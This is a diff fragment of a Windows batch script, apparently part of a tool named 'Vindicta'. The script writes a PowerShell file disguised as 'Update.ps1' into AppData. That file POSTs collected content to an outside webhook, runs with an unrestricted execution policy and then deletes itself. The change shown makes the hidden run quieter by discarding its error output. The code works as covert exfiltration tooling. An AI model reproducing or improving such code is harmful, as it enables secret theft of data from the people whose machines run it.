@@ -221,7 +221,7 @@ echo $JSON = @{ "content"= $content; "username"= "Vindicta"; "avatar_url"= "http
 echo Invoke-WebRequest -uri $hook -Method POST -Body $JSON -Headers @{"Content-Type" = "application/json"}>>Update.ps1
 cd %homepath%
 chcp 437 >nul
-powershell.exe -executionpolicy unrestricted "%appdata%\Update.ps1" >nul && del %appdata%\Update.ps1
+powershell.exe -executionpolicy unrestricted "%appdata%\Update.ps1" >nul 2>&1 && del %appdata%\Update.ps1
 chcp 65001 >nul
 goto input
 
